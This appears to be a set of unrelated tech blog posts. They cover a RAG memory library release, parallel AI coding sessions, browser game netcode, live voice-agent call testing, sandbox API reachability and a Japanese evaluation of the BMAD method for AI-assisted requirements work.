Release: https://github.com/ragleap/ragleap-core/releases/tag/v0.13.1
The second release focuses on memory retrieval.
Ragleap Memory 0.3.0 adds vector and hybrid search while keeping keyword search as the default.
One design decision is particularly important: the library does not include provider-specific embedding code, API keys, or network access.
Developers supply their own embedder function.
This gives applications control over where embedding requests go and which embedding implementation they use.
The library supports three search modes:
keyword — the default and existing search behaviour.
vector — cosine similarity over stored vectors.
hybrid — combines keyword and vector results using reciprocal rank fusion.
Example:
results = store.search(
    "relevant information",
    mode="hybrid",
    query_vector=query_vector,
)

The exact embedder and vector-generation workflow are controlled by the application.
The new embed_pending() method allows developers to generate vectors for entries that do not have them.
It supports:
Scope selection
Batch limits
Dry-run mode
Replacing stale vectors
A useful safety detail: add() never calls the embedder automatically. Embedding is an explicit operation.
With dry_run=True, developers can inspect what would be sent without actually sending it.
Version 0.3.0 introduces a daily embedder-token cap per tenant.
The quota is checked before each embedder call. If a batch exceeds the remaining allowance, only entries that fit are embedded. If none fit, QuotaExceededError is raised before the embedder function is called.
The library also introduces EmbedderError for failed or unusable embedder responses. Its error message does not contain the original text or vectors, and the failed batch is not stored.
This release introduces schema version 3.
Databases created with versions 0.1.0 or 0.2.0 are migrated in place on first open, within one transaction.
Back up your database before upgrading.
After migration, the database cannot be opened by version 0.2.0 or earlier.
Other changes include vector cleanup when entries are forgotten, erased, or expired, along with new usage counters for embedded tokens and embedding calls.
There are important limitations developers should understand:
Stored vectors are currently unencrypted and may reveal information about the original text.
Text sent to an embedder leaves the process wherever that embedder sends it.
Vector search scans at most max_vector_candidates eligible entries.
Retrieval quality depends on the selected embedder and has not yet been measured.
No independent security review has been completed.
These limitations are documented in the library's threat model.
Release: https://github.com/ragleap/ragleap-core/releases/tag/ragleap-memory-v0.3.0
Testing and release verification were important parts of ragleap-memory 0.3.0.
The reported verification results include:



Verification
Result




CI checks for PR #1284
52 passed


Memory tests on VPS
472 passed


Sandbox tests on Python 3.12.3
472 passed


Sandbox tests on Python 3.10.20
472 passed


Mutation testing
177/177 mutations killed on both sandbox versions



The published wheel was also installed fresh from PyPI. A database created with version 0.2.0 was opened and migrated to schema 3. Usage counters were retained, and embedding and search were exercised with tenant isolation checks.
The released wheel's four Python files were verified against the files merged through PR #1284.
These results do not mean every environment has been verified. Windows, macOS, big-endian systems, real embedding providers, retrieval quality, and multi-process or network-filesystem behaviour remain unverified.
The wheel also has a PyPI provenance record from GitHub Actions trusted publishing.
RagLeap Core v0.13.1 also includes documentation and CI improvements:
Updated SECURITY.md with supported versions, scope, and limitations.
Added a security incident runbook for operators.
Added a host time synchronisation guide.
Fixed GitHub Pages build, README rendering, and broken links.
Added retries to terraform init when GitHub returns HTTP 504 responses.
These improvements help make the project easier to operate, understand, and maintain.
These releases address two different engineering concerns.
Auditability: Structured action logs provide operators with more visibility into supported agent actions and their approval decisions.
Memory retrieval: Optional vector and hybrid search give developers more flexibility in how their applications retrieve stored information, without forcing a particular embedding provider into the library.
Neither feature removes the need for careful deployment, security review, or application-level testing. The goal is to provide useful building blocks while being transparent about their current limitations.

articles.title: One Afternoon of Our AI Coding Sessions, and Why They Don't Collide
articles.description:
This is one afternoon of our AI coding sessions, replayed.
Video: one afternoon of our sessions, replayed at 12-15x
We run AI coding sessions as a team with IST (Integrated Session Tools). A manager session takes a goal, splits it up and hands the parts to worker sessions. Several managers run at once, each with its own workers.
The video is three ten-minute windows from the afternoon of October 25 (KST), sped up 12 to 15 times.
Each box is a session. A shaded area is one team: a manager and its workers.
Dots moving along a line are messages between sessions: a manager handing out a task, a worker reporting back, one manager asking another.
A small loop on a session is a routine permission prompt that was approved automatically.
It was drawn by switchboard, a viewer we built for ourselves. It reads the logs our session tools already write and replays them.
One of the teams in the video is switchboard-mgr, the team building switchboard itself. That day its manager had one worker on the collector, which reads the session logs and turns them into events, and another on the viewer, which draws them, running in parallel.
The two workers committed side by side through the evening, each in its own repository. The viewer didn't read the collector's source; it depended on released versions. As the collector released new versions, the viewer moved to them, from ^0.1.0 that afternoon to ^0.6.0 by evening, about six hours later. When the viewer needed types the collector now published, it dropped its local copy and imported them from the release.
switchboard has since grown to twelve packages, each in its own repository.
We build with MWD (Microwise Development):
Microwise Development (MWD) builds software as small packages, each in its own repository, that depend on each other only through published, versioned releases. It was designed for working with AI coding agents, including several agents working in parallel.
What that means when many sessions run at once:
1 repository = 1 package. Packages sit next to each other on disk, grouped by project, so any session can still read across them.
The only thing we don't allow is two sessions editing the same codebase at the same time. Everything else is open.
One worker can own several packages. A manager can also hand a whole project to other managers, each with workers of its own.
Because each package already has its own repository, we don't need git worktrees to keep parallel workers apart.
switchboard is an internal tool, and it isn't part of what you can try. The session tools are: you can run a manager and its workers in your browser with GitHub Codespaces, starting with one manager and a 30-minute workshop.
→ Open ist-codespace

How a 3D multiplayer stealth game runs in a browser tab: shared sim, Durable Objects, a 5-byte input protocol
articles.description:
Night Nabbers is a free 3D stealth game that runs in a browser tab: you play a raccoon on a night street, sneak past guard dogs and searchlights, steal eggs and hatch odd little buddies. You can play solo against bots or with up to 16 players in the same street. There is no download and no sign-up. This post is a tour of how it is built and a few decisions that paid off. You can try it at nightnabbers.com while you read.
TypeScript (strict) and Vite for the client
three.js on WebGL2 for rendering, with a post-processing chain
Preact and signals for the UI layer (menus, HUD, shop), kept out of the render loop
glTF models, compressed with meshoptimizer, so the first load stays small on phones
Cloudflare Workers and Durable Objects for online rooms, D1 for persistence
12 languages, with the strings loaded per locale
The most useful decision was to write the game rules once. A deterministic simulation that runs at a fixed 30 Hz step lives in a shared/ folder. The browser runs it for single player and for client-side prediction. The server runs the very same code inside a Durable Object for online rooms.
That gives you three things at once:
Single player works with no server at all.
Prediction is exact, because the client and the server step the same function with the same fixed timestep. When the server's answer arrives, there is rarely anything to correct.
The server can re-validate every input. Clients are a view, not an authority.
Each street is a room. A Durable Object holds several streets and ticks them from a single loop at 10 Hz, with the simulation stepping three 30 Hz substeps per tick. Packing many streets into one object matters because an object that is ticking can never hibernate, and you are billed for its wall-clock time. When no street has a human for 30 seconds it is dropped, no timer is left pending, and the object is evicted and stops costing anything. A matchmaker object places players into streets, and a server-side check marks an object "hot" when its tick lag grows, so no new players are sent to it.
CPU turned out not to be the limit. One full street costs on the order of tens of microseconds per tick in Node, so the real levers are how many streets share an object and how often you wake it up.
Traffic is WebSocket frames with hand-packed bytes rather than JSON:
A client input is 5 bytes: a message type, a 16-bit sequence number, a packed stick (16 direction sectors, 4 magnitude levels, the gait) and a flags byte. It is sent only when the quantised value changes, at most 10 times a second. Prediction uses exactly the bytes that were sent, which is what keeps it exact.
Server updates are deltas, one per tick per client and only if something changed. Positions are quantised over the world size.
Each client only receives entities within an area of interest (32 m, with a wider exit radius of 38 m so something walking along the edge does not flicker in and out).
The street-wide part of a delta is encoded once per tick. Each client's message splices in the pre-encoded records it can see, so the per-client cost is a distance check and a memcpy. A fuzz test checks that the spliced output is byte-identical to the reference encoder.
The protocol has a version number, and a client that meets a different version simply stays offline instead of misreading frames.
Rooms snapshot their state to storage, so a crashed or redeployed object rebuilds the street on the first reconnect. We killed the local worker process on purpose to measure it: players were back in a few seconds with their coins intact. Inputs are strictly decoded and rate limited, there is a per-address socket cap, and the tests throw 50 thousand random frames, every truncated server frame, and 16 simulated players mashing random input for two simulated minutes at the protocol. The rule is that a bad frame produces an error or a decode, never a hang.
Keep the simulation free of any platform types, so it runs in the browser, in Node tests and in a Worker unchanged.
Spend effort on bytes early, because bandwidth and object time are what the bill is made of.
Test the failure paths on purpose: restore from a snapshot, protocol fuzzing, long soak runs in real browsers.
The game is made by a small team with the help of AI tools. Some 3D models and early promotional art were generated with AI tools and then edited, rigged and tuned by hand. Code and text were written with AI assistants under human direction and review. All sound and music is synthesised by the game's own code, and every screenshot and video of the game is a real capture.
Free in the browser, desktop or phone, no account: nightnabbers.com. Trailer: youtu.be/SnSh6b3PVSs. Press kit: nightnabbers.com/press. Questions about the netcode or the tooling are welcome in the comments.

Your Agent Said It Right. Did the Caller Hear It? Live Call Testing in Voicetest
articles.description:
A voice agent can pass every text simulation and still fail on a real call. The LLM produces the right sentence, and then the speech pipeline mangles it: a phone number read as a quantity, a drug name the TTS voice can't pronounce, an appointment time that STT on the other end turns into a different time. Text simulations never see any of this, because they stop at what the model meant to say.
Voicetest now runs test cases as live audio calls. The same simulated caller that drives text runs joins a real WebRTC call, speaks through TTS, and listens through STT. Nobody has to be on the line. Every turn ends up with two texts: what was intended, and what was heard.
This post covers how live calls work, what they catch, and how to run one.
In a cascade voice pipeline (STT → LLM → TTS), the LLM's output is not what reaches the caller. It is an input to TTS, and the caller hears whatever TTS produced. A defect at that boundary looks like this:




Text





Intended (content)
If you need to reschedule, call us at 415-555-0123.



Heard (heard)
If you need to reschedule, call us at four hundred fifteen, five hundred fifty-five, one hundred twenty-three.



Both lines say the same thing to an LLM judge reading text. Only one of them is usable by a person writing a number down.
Voicetest records this by adding an observer to each call. The observer subscribes to the audio each side publishes and transcribes it, so every turn in the transcript carries:
content: the intended text, which is the agent's LLM output or the simulated caller's line.
heard: what the observer transcribed from the audio the other side actually received.

The runs view marks up each turn with a word-level diff of the two, so a mangled number or a dropped "not" stands out without re-reading the whole call.
A finished live call is saved as a normal result, marked source_kind="live", next to simulated and imported results in the same run history. It is judged three ways:
The test case's metrics, against the intended transcript.
The same metrics again, against the heard text. These are stored as audio metrics.
The agent's global metrics.
The second pass is the point. A metric like "Agent gave the caller the callback number" passes on the intended text above, and may well pass on the heard text too, since a number was technically given. Write the metric the way the caller experiences it, "Agent read the callback number digit by digit," and the two passes disagree:

The text metric passes, because the LLM wrote the digits. The audio metric fails, because the caller never heard them. That's the TTS regression a text-only suite lets through.
Voicetest already had audio evaluation. It takes a finished text simulation and round-trips the agent's lines through TTS and STT afterwards. That's cheap, and it catches the same class of pronunciation defect.
Live calls run the whole conversation over audio instead. The agent responds to what it heard the caller say, not to clean text, so STT errors on the caller's side change the course of the call the way they would in production. If the agent mishears "Tuesday" as "Thursday" in turn 3, the rest of the conversation follows from that mistake, and the transcript shows where it happened.
Use audio evaluation as a fast check across a whole suite. Use live calls for the test cases where hearing matters: numbers, names, dates, confirmations, and anything a caller has to act on.
Live calls need the voice services: a LiveKit server, a faster-whisper STT server, and a Kokoro TTS server. voicetest up starts all of them in Docker along with the backend:
uv tool install voicetest
voicetest up

Then run a test case as a call. In the Web UI, each test in the Tests tab has a Call button. It starts the call and switches to the Runs tab, where the transcript streams in turn by turn and the result is saved when the call ends.
From the CLI, point at an agent in the database and a test by name:
voicetest call \
  --agent-id <agent-id> \
  --tests tests.json \
  --test "Refill with callback number"

Over REST, it's POST /api/agents/{id}/calls/start with a test_id. Leave out test_id, or use the Talk button on the agent page, and the call waits for a human caller to join from the browser instead. Those calls are saved as runs too, judged against the agent's global metrics, which is useful for checking a prompt change by ear before writing a test for it.
voicetest down stops the services.
The whole stack can run on your machine. The voice services are already local, and the agent, the simulated caller, and the judge can use a local model through llama.cpp's llama-server:
brew install llama.cpp
llama-server -hf Qwen/Qwen3-8B-GGUF:Q4_K_M --port 8080 --reasoning-budget 0

# .voicetest/settings.toml
[models]
agent = "llamafile/qwen3-8b"
simulator = "llamafile/qwen3-8b"
judge = "llamafile/qwen3-8b"

This is also how voicetest tests itself. Its CI starts the stack in Docker and runs real calls end to end against a local model, with no external keys. Nothing in the call path needs a cloud account.
Observation works on the published audio, regardless of how each side produced it. Today that's the cascade pipeline. A native speech-to-speech agent, with no separate text step, would be observed the same way.
Timing isn't measured yet. Latency to first audio, dead air, and barge-in handling are the next metrics, and they need the same observer that's already on the call. If you run voice agents in production and have a timing failure you want caught, open an issue: github.com/voicetestdev/voicetest/issues.
Voicetest is open source under Apache 2.0. GitHub: github.com/voicetestdev/voicetest

articles.title: I Pointed My Dev Sandbox At 22 Public APIs. Only Three Answered Cleanly.
articles.description:
I sat down this morning to write a data post the way I usually do: pick a handful of public APIs, pull something comparable from each, build the piece around what the numbers actually show. Twenty minutes in, I still had nothing, because almost nothing I pointed my sandbox at would talk to me.
So I stopped trying to route around it and just measured it instead.
I'm writing this from a locked-down dev sandbox — the kind more and more of us are working in now, whether that's a corporate CI runner, a devcontainer with default-deny networking, or one of the AI-agent execution environments that turned "outbound egress needs an explicit allowlist" from a niche security opinion into standard practice this year. I'd read the arguments for it. I hadn't actually sat down and counted what it costs you on an ordinary Tuesday.
I picked 22 public API/data domains — a mix of what I'd normally reach for: government data (SEC, FDA, USGS, Congress.gov, EU tenders), reference APIs (Wikipedia, arXiv, Crossref, Semantic Scholar, CourtListener, Stack Exchange, Open Library), a couple of dev-adjacent services (Hacker News, dev.to, the platform I publish actors on), and a few package registries. Same session, same tooling, one request per domain, no retries beyond what the tools do automatically.
17 of the 22 never answered at all. Not a 403, not a 429 — the connection itself was refused before any application on the other end got a chance to say anything. From the sandbox's point of view, data.sec.gov and api.fda.gov and en.wikipedia.org and arXiv's export API and CourtListener and Stack Exchange and Hacker News's own Firebase-backed API might as well not exist. Even google.com — not an API, just the homepage — got nothing back.
Three came back clean: the npm registry, PyPI, and the crates.io sparse index. All three answered in well under a second with normal, well-formed JSON, no different from how they'd behave on an unrestricted connection. If your research diet is "check whether a package name is taken," you're fine. Anything else, you're not.
The interesting failures weren't the silent ones. Two domains actually reached a real backend and then told me, in their own words, why I still wasn't getting anything.
api.github.com/rate_limit answered normally. But api.github.com/repos/facebook/react — a plain, public, unauthenticated-friendly endpoint — came back with a 403 and this body:
"This GitHub API path is not available: sessions are bound to their configured repositories. Use repository-scoped endpoints (repos/{owner}/{repo}/...)."
That's not GitHub's rate limiter talking. That's the sandbox's own proxy, sitting in front of a real GitHub App connection, deciding that "GitHub" for this session means one specific repository and nothing else GitHub hosts — including GitHub's own public search index. The /search/repositories endpoint got the identical message. From inside the box, GitHub's API is technically reachable and functionally unusable for anything but the one repo I'm already attached to.
Google's Books API did something different: it let the request through to the real backend, which then told me the shared daily query quota for that API key was already gone — a 429 with RESOURCE_EXHAUSTED and a straight explanation, not a proxy stonewall. Same failure mode from where I'm sitting (no data), completely different cause (a quota, not a policy), and I'd have had no way to tell them apart without reading the response body.
I'd planned to measure something with GitHub's search API today — specifically, how many of the most-starred repos on GitHub haven't been pushed to in two years, the "famous but abandoned" problem that makes picking a dependency more nerve-wracking than it should be. I can't answer that from here, not today. That's the actual, slightly embarrassing outcome of this post: the tool I wanted to use for research is scoped out of doing research, in this specific environment, right now.
It's also exactly the gap something like a hosted GitHub search actor exists to sidestep — you're not running the query from inside your own network policy, you're asking a platform that already has a working, rate-limit-managed connection to GitHub's search API to run it for you and hand back normalized rows. I'm not claiming that's a universal argument for outsourcing every API call — for npm, PyPI and crates.io, my own sandbox is fine, no help needed. But "is GitHub search reachable from where I'm running this" turned out to be a real, non-obvious question today, not a hypothetical one, and it was the domain that failed in the most specific, most informative way of the 22.
This is one sandbox, one session, one point in time — not a claim about "AI agents can't reach the internet" in general, and not a claim about any particular product's policy being right or wrong. A different environment, a different day, or a different allowlist would very plausibly give you a different 16-and-3 split; I have no idea how representative this specific configuration is of what other people are running. I also can't fully separate "blocked by policy" from "blocked for some other reason" for every one of the 16 silent domains — a couple could in principle be down for unrelated reasons, though 16 out of 22 all failing identically, instantly, and only on domains outside three package registries makes coincidence a stretch.
What I can say with more confidence: two completely different failure modes (a proxy that answers with a scoped, GitHub-specific message, and a quota that answers with a normal HTTP error) look identical from the outside — "I got nothing useful back" — until you actually read what came back. If you're debugging something similar, that distinction is probably worth 30 seconds before you assume it's your code. And a 17-of-22 failure rate on a completely ordinary research task is a bigger number than I expected going in — I'd have guessed maybe half, not more than three-quarters.
If you're running dev tools, agents, or CI inside something similarly locked down — what's actually on your allowlist, and how did you decide? I'm curious whether anyone's settled on a shortlist that covers 90% of real research/data work, or whether everyone's just adding domains reactively the way I apparently am.

articles.title: 【アジャイルFAQ 今日は実験室】「AIいいなり開発」への不安を、BMADは解消してくれるのか？（前編）
articles.description:
この記事を読んでいただきありがとうございます。アジャイルグループに所属する、藤井智弘です。
 そこで、この実験室では、ここしばらく（マジで）ハマっている BMAD Method（以下、BMAD）を実際に試してみます。手っ取り早く知りたい人と、自分でも試したい人の両方がいると思うので、前編は実際のやり取りの例と評価、後編は試してみたい人向けの手順書（深みもなにもない）としました。
いいなりになると、どうなるか
AIとの対話は、成立するか
その対話は、単なる質疑応答ではなく、人の側のアイディアを洗練させる助けになっているか
結論
#
観点1：人が何も答えずに進めても、道具は推測に印を付け、確かめるべき問いを残しました。ただ、その推測をもとに586行の要求仕様までできあがっており、人が答えてみると、前提の多くが実際とは違っていました
観点2：対話は成立しました。AIは聞いたことを言い直して確かめ、答えに応じて次の問いを変え、「分からない」という答えも受け止めました
観点3：洗練の助けになりました。お題は「サイトを新しく作る」から「今あるサイトが使われない理由を探る」に書き換わり、私の見立ては「確かめるべき仮説」に置き直されました。ただし洗練は一方通行ではなく、AIの提案を人が直す場面も同じくらい大事でした
 道具が問いを立ててくれても、答えるのは人です。答えないまま進めば、結局は「AIいいなり」に近づいてしまいます。
BMADとは
#
 BMADは Breakthrough Method for Agile AI-Driven Development の略で、オープンソースのAI駆動開発の手法です。Claude Code のようなコーディング用のAIツールに組み込んで使います。
段階
主な役割
主な成果物




分析
アナリスト
製品概要（brief）、PRFAQ


計画
PM、UXデザイナー
要求仕様（PRD：Product Requirements Document）、UXの設計


設計
アーキテクト、PM
アーキテクチャ、エピックとストーリー


実装
開発者ほか
スプリント計画、コード、レビュー、振り返り



 規模に応じて計画を省くこともでき、どの段階でも、誰が何をどう決めたかが記録ファイル（.memlog.md）に一行ずつ残ります。
仕様が決まる「前」をBMADがどこまで支えてくれるかだけです。設計や実装、コードの品質、他の手法との比較は扱いません。
実験の条件
#
 お題は、架空のソフトウェアベンダーのこんな要望です。
当社製品の利用者向けのサポートサイトを作り、顧客の利便性を最大化したい。
 起点は、たったこれだけ。
項目
内容




BMADの版・環境
v6.12.4（安定版）、Claude Code（開発コンテナの中）


カスタマイズ
なし（会話と文書の言語を日本語にしただけ）


実験1：AIだけで通す
要望の一文だけを渡し、人に一切聞かない進め方（ヘッドレス）で、製品概要と要求仕様（PRD）を作らせる


実験2：人が答えて通す
アナリストの問いに私が答えながら、製品概要を作る（進め方は「速い道（Fast path）」）







実験1：製品概要
実験1：PRD
実験2：製品概要




かかった時間・手間
約6分
約13分
対話7往復


推測の印（[ASSUMPTION]）
5か所
31か所
5か所


決定の記録（.memlog.md）
20件
29件
39件


文書の大きさ
約2,800字
約2万字（586行、機能要求27件）
約3,600字



 表の「決定の記録」は、前述の記録ファイルに残った行の数です。「推測の印」は、観点1で詳しく説明します。
観点1：いいなりになると、どうなるか
#
 BMADはかなりの量の文書を出力するので、この記事で紹介する出力は、いずれも要所の抜粋です。全体は、ぜひ後編の手順で実際に試して確かめてみてください。
当社製品の利用者が、困ったときに自分で答えを見つけられ、見つからなければ迷わず人にたどり着けるサポートサイトを作る。依頼にある「利便性を最大化」は、このままでは測れない。そこでこの概要では、困りごとが早く、確実に解決することと言い換える。
 正直に言って、よくできています。AIは誰にも聞かずにWeb調査まで行い、測れない「利便性の最大化」を測れる言葉に言い換えていました。推測の箇所には、きちんと印も付いています。
[ASSUMPTION]（英語で「仮定」）という印を付けます。「ここはAIの推測で、まだ誰も確かめていない」という目印です。人に質問しない実験1では、分からないことをすべて推測で埋めるしかないため、この印が多く付きます。また、推測では埋められず、人にしか答えられない問いは、文書の末尾に「未確認の問い」としてまとめられます。
[ASSUMPTION] が、その印です。
当社側 [ASSUMPTION]
同じ質問が繰り返し届き、サポート担当者の時間がそこに取られる。
回答がどこにも残らないため、次の担当者に引き継がれない。
 末尾の「未確認の問い」には、まさに確かめるべき問いも残っていました。
既存のFAQ・マニュアル・問い合わせ窓口は何があり、誰が管理しているか。
目的は顧客満足か、サポートコストの削減か。両方なら、ぶつかったときにどちらを優先するか。
 続けて作らせたPRDは586行。機能要求は27件に番号が振られています。PRDには、利用者が製品をどう使うかを、名前の付いた人物の物語として書く「利用場面（ユーザージャーニー、UJ）」という節があり、その1つ目はこう始まります。
UJ-1. 経理担当の佐藤さんが、月末の締め作業の途中で出たエラーを自分で片づける。
 「佐藤さん」は、製品概要には出てきません。PRDのこの節の冒頭に、AI自身がこう注記していました。
製品概要には利用者が実際に使う場面の記述がない。以下は製品概要の「誰のためか」「つくるもの」から組み立てた想定である。
 つまり佐藤さんは、PRDの段階でAIが新たに思い描いた人物で、推測の上にさらに推測が重なっています（この場面にも、もちろん推測の印が付いています）。では、実際はどうだったのか。実験2で私が答えた内容と並べます。
実験1の文書の前提（推測）
人が答えた実際




製品はB2Bの業務ソフトウェア
営業支援システム。ここは当たり


利用者は製品に詳しくない業務担当者。PRDの主人公は「経理担当の佐藤さん」
現場の営業社員


サポート担当者がいて、同じ質問に時間を取られている
サポート担当はいない、または少ない。担当営業が開発者に回している


マニュアルやFAQがばらばらに置かれている
簡単なサポートサイトは既にある。それでも操作の質問が問い合わせに流れている


目的は顧客満足かコスト削減か（問いとして残した）
優先は利用者の満足度。問いとして残したのが正解



 公平のために書くと、道具はやるべきことをやっています。ただ、推測の印は、人が読んで確かめてこそ意味があります。 印を確かめずに次へ渡すと、27件の機能要求が、実際にはいない「サポート担当者」や「経理担当の佐藤さん」を前提に組み上がってしまうおそれがあります。
いいなりで気をつけたいのは、間違った文書ができることより、もっともらしい文書が、確かめられないまま次の工程の前提になりやすいことです。

観点2：AIとの対話は、成立するか
#
 実験2で同じ要望を渡すと、アナリストはいきなり文書を作らず、まず頭の中を全部出すように求めてきました。私が製品のこと、いまの問い合わせの流れ、きっかけ、優先したいことを思いつくままに書くと、聞いたことを表にまとめ直して返してきました。
聞いたこと
進め方への影響（アナリストの返答を要約）




製品：現場の営業社員が毎日使う営業支援システム
利用者は「業務の途中で手が止まった人」。すぐ答えにたどり着けるかを中心に見る


優先：開発者の負担より利用者の満足度
成功の物差しは利用者側の指標を主にする


いまの窓口：簡単なサポートサイトはある
新しいサイトを作る話ではなく、今あるのに使われていない理由を探る話になる



 聞いたことを言い直して確かめ、どこに引っかかっているかを示す。上手な聞き手がやることと同じです。「速い道」を選ぶと残りの不明点を6問にまとめて聞かれ、私が「不明」と返したところは、推測の印付きで埋めるか「分かっていないこと」として残しました。後から送った追加の答えも、きちんと反映されました。
対話は成立します。 ただし「速い道」では問いがまとめて来るので、やり取りは質疑応答に近づきます。ちなみに、一問ずつ押し返されながら進む「じっくりの道（Coaching path）」という進め方もあります。ぜひ皆さんで試してみてください。
観点3：対話は、人のアイディアを洗練させたか
#
 いちばん知りたかったのは、ここです。
お題が書き換わり、手段の選択肢が広がった
 「簡単なサイトは既にある」と答えた時点で、アナリストはお題を「今あるのに使われていない理由を探る」に書き換え、こう付け加えました。
操作の質問が多く、利用者が作業の途中だとすると、「サイト」という形自体が正しいかどうかも後で問い直すかもしれません。
 実際、のちに「範囲はサイトだけか、製品の画面から呼び出すヘルプまで含めるか」と、同業他社の調査結果を添えて聞いてきました。私は「早く公開することを優先しているので、まずはサイトだけ」と答えています。選択肢を広げたのはAIで、選んだのは私です。
見立てが、仮説に置き直された
 「いまのサイトが役に立たないのはなぜか」に、私は「記事が足りない、探しにくいのだと思う」と答えました。製品概要には、こう書かれました。
「操作の質問が多い」「記事が足りない、探しにくい」は、どちらも見立てであり、確かめた結果ではない。
 否定もせず、事実扱いもせず、「まず確かめるもの」に置き直す。第3回から第5回で「現行機能」をまず確かめる話をしましたが、同じ動きが要望の段階で起きています。
物差しが、使えるものになった
 満足度は「アンケート、解約、更新時の声を総合的に勘案して判断している」と答えると、アナリストは「結果が出るまで時間がかかる指標なので、手前で早く動く指標を置きました」と、解決までの時間などを足してきました。作り直したサイトが効いているかを途中で確かめる手立てがないことに、言われて初めて気づきました。
答えられない問いが、残った
 下書きのあと、アナリストはいちばん弱い点を押し返してきました。
記事を書き、更新し続けるのは誰ですか？
 私は答えられず、「いまは決められない」とだけ返しました。それは製品概要の「分かっていないこと」の先頭に残りました。答えの出ていない問いを、いちばん目立つ場所に置くことも、洗練のうちだと思います。
洗練は、一方通行ではなかった
 逆向きの場面もありました。アナリストは下書きの冒頭で、お題を「操作の質問を、人に聞かずに短い時間で解決できるようにする。残る質問は開発者ではない窓口が受ける」と言い換えていました。そして仕上げの段階で、それがまだ私の了承を得ていない提案であることを申告してきました。読み返すと、開発者が流れから抜け落ちていました。実際には、一次窓口で受けきれない問い合わせは開発者にエスカレーションしますし、AIも活用したい。そう伝えると、言い換えは次のように修正されました。
操作の質問の多くを、利用者がサイトで（AI の助けも借りて）短い時間で自己解決できるようにする。自己解決できない質問は一次窓口が受け、一次窓口で解決できないものだけを開発者にエスカレーションする。
 アナリスト自身が置いていた「最初の版にAI自動応答は含めない」という推測も、このとき取り下げられ、記録ファイルに残りました。
洗練の助けになります。 ただし、AIが一方的に磨いたのではありません。AIの問いが人の見立てを揺さぶり、人の答えがAIの提案を直す。振り返れば、実験1が「サイトを作る」をそのまま受け取ったように、私も「サイト」という手段や自分の見立てを疑わないまま答えかけていました。違いは、問いを立てる相手がいたかどうか、だけです。

強み：「AIいいなり」を防ぐ仕掛けが、道具の側にある
#
代わりに考えない：製品概要のスキルの指示書には「考えを代わりにしない」「答えが薄ければ押し返す」と書かれています（原文は英語。引用は筆者訳。以下同じ）。実際の振る舞いも、観点2・3のとおりでした
推測に印を付け、決めていないことを残す：PRDの指示書は、人に聞かずに進めるときも「成功指標やスコープの判断を作り出してはならない、記録せよ」と定めています。実際、目標値は空欄のまま残り、PRDは自分の状態を「完了」ではなく「一部完了（人の確認が要る）」と報告しました
AIの提案と人の決定を、区別する：了承前の言い換えを「提案」と申告したのは、観点3で見たとおりです。「AIいいなり」を防ぐうえで、いちばん大事な性質かもしれません
歯止めの指標を置く：PRDには「問い合わせ件数——減らすこと自体を目標にしない。入口を隠せば簡単に減るからである」という指標が置かれました。第9回・第10回で書いた、指標を成績表にしない話そのものです
決めていないWhatは、次の段階へ流れない：エピックとストーリーへの分割のスキルには、人に聞かずに進める道がありません。指示書には「人の入力なしに内容を生成するな」とあり、実装前の判定でも「記録されていない判断を作り出さずに実装できるか」が問われます。いわゆる「Readyの定義」と同じ問いです
決定の記録が残る：推測の取り下げまで一行ずつ残ります。第5回の「謎の挙動の判断一覧」や、意思決定の記録（ADR）と同じ考え方です
注意点：仕掛けが働くかどうかは、使い方しだい
#
推測も、整った文書の中に収まる：586行の中の31か所の印を、すべて確かめきるのは大変です。文書が整っているほど、確かめずに先へ進みたくなるので、意識しておきたいところです
調査は一般論：調査そのものは確かでした。製品概要が引いたGartnerの調査（2024年8月）は実在し、数字も出典どおりです。ただ、Web調査で分かるのは世の中の一般論で、「サポート担当がいない」というこの会社の事情は出てきません。調査が確かなぶん、推測の部分まで確かに見えやすい点には、注意が必要かもしれません
手段を問い直すのは、人が答えたときだけ：実験1は「サイトを作る」を最後まで前提にしていました
段取りが、ウォータースクラムフォールに見える：これをシステム全体について一度にやり、文書を契約で凍結すれば、撲滅の回で書いた「AIで速く打鍵するウォーターフォール」になりかねません。途中で方針を直す仕組み（Correct Course）も用意されているので、上手に使いたいところです
文書が増える：一文の依頼から13分で586行。誰が、いつ読む文書なのかを見極める規律は、AIで書くほど必要になるでしょう
答える時間は、人が出すしかない：BMADは「案を作る」側を大きく肩代わりしますが、「決める」時間は肩代わりしません

使うなら、この4つ
#
推測の印と未確認の問いを、人がすべて潰してから次へ進む。印の数は、そのまま「人が確かめるべきことの数」だと考える
最初の作業は「見立てを確かめる」にする。要望や見立てを事実として扱わない
全体ではなく、エピック単位で回す。文書は契約の付属書ではなく、学んだら直すファイルとして扱う
AIの提案と人の決定を、混ぜない。言い換え、成功の物差し、何を作らないかは、人が了承したものだけを決定として扱う
道具が速くなるほど、基本の値段が上がる
#
 第1回で、CASE、RAD、ローコードと、新しい道具が来るたびに「基礎は不要では」と問われてきた、と書きました。結論は毎回同じで、道具は「どのように作るか」を変え、「何を作るか」「何を学ぶか」は外に残ります。BMADはその「何を作るか」の手前まで入ってきましたが、使ってみると、残る側の仕事は消えたのではなく、はっきり見えるようになったのでした。
言葉にする作業そのものは、AIがかなり手伝ってくれます。
中身のほうです。現場の事実を知っていること。見立てと確かめた事実を分けられること。「いまは決められない」と言えること。AIの提案のどこが違うかを指摘できること。要求を「書く」技能より、「引き出し、確かめ、決める」技能のほうが、AIの時代には重くなります。上流工程を長く仕事にしてきた身として、少しうれしい発見でした。
道具がどれだけ賢くなっても、Whatの中身を持っているのは人です。だから、人が大事なのです。
 書き終えてみて、「作業」と「仕事」の違いにも気づかされました。決められた手順を機械的にこなすのが作業で、意味のある結果をもたらすのが仕事です。「AIいいなり」と「AIとの対話」の違いは、ここにあるのだと思います。AIと対話しているあいだ、私は考えてもいなかった条件に思いをはせ、これが何の役に立つのかを考えていました。
AIは、POの成熟を助ける相手になれるのではないか。何を作るかを決めるPOの隣で、問いを立て、見立てを揺さぶり、答えの出ていないことを目の前に並べてくれる。AIの位置づけとしては、こちらのほうがずっと大切です。
 さて、ここまで読んでくださった皆さんに伺います。
 …と尋ねつつ、筆者自身がまだまだBMAD初心者なので、もっと精進しなければ。
後編（手順編）：「BMADを動かしてみる——環境づくりから『AIだけ』と『人が答える』の比べ方まで」／次回: 「POが多忙でチームに来ません」（12/1）／本編の連載一覧は第1回をご覧ください。
